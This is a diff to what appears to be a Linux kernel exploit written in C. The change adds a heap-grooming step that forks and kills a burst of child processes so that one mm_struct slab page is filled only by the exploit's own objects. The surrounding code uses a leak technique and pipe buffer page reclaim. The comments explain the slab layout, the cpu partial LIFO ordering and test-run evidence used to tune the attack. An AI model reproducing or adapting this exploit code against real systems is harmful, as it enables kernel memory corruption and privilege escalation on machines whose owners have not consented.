@@ -246,6 +246,41 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   setup_kernelsnitch();
   pr_info("pipe child kernelsnitch setup done\n");
 
+  /* Groom the CORE mm_struct slab right before the pre+leak sequence.  The
+   * pre storm is sized objs_per_slab-1 and leak_child fills the 34th slot:
+   * the design wants one FRESH page whose every slot is chain-owned, so the
+   * pre/leak kill below empties that page completely and the wave sweep can
+   * push it back to the buddy (771b7409 evidence: waves=2 taken=1 owned=1
+   * -> root=1).  Starting the pre storm on a half-full page instead -- boot
+   * -time system/app forks interleave foreign long-lived mm_structs into
+   * the active cpu slab -- straddles two pages, leak_child lands elsewhere,
+   * and after the kill the leaked page keeps its foreign objects forever
+   * (forensics: inuse=34 objects=34 frozen=0, sc identical across 24 waves,
+   * owned=0 on 19 rounds over two boots; nothing the wave can kill, since
+   * those holders are other processes' mms).
+   *
+   * Fork-and-kill a burst first: it fills every free slot of the active
+   * page plus the cpu partial chain (spray puts MM_PARTIALS pages there), so
+   * the last groomed page ends up the active one -- entirely groom-owned
+   * (its slots all free again after the kill) -- and put_cpu_partial is
+   * LIFO, so whatever page the pre storm pulls is a groom page too.  The
+   * pre+leak pair then fills a chain-only page; foreign forks can only
+   * interleave inside the ~2ms pre storm window instead of seeding the
+   * start page outright. */
+  {
+    size_t groom_n = (size_t)(MM_PARTIALS + 2) * objs_per_slab;
+    pid_t *gp = calloc(groom_n, sizeof(pid_t));
+    SYSCHK(gp);
+    for (size_t i = 0; i < groom_n; i++)
+      gp[i] = clone_child();
+    for (size_t i = 0; i < groom_n; i++) {
+      kill_child(gp[i]);
+      gp[i] = 0;
+    }
+    free(gp);
+    pr_info("pipe child slab groom done n=%zu\n", groom_n);
+  }
+
   for (size_t i = 0; i < pre.mm_cnt; i++) {
     pre.childs[i] = -1;
     pre.memfds[i] = clone_memfd();
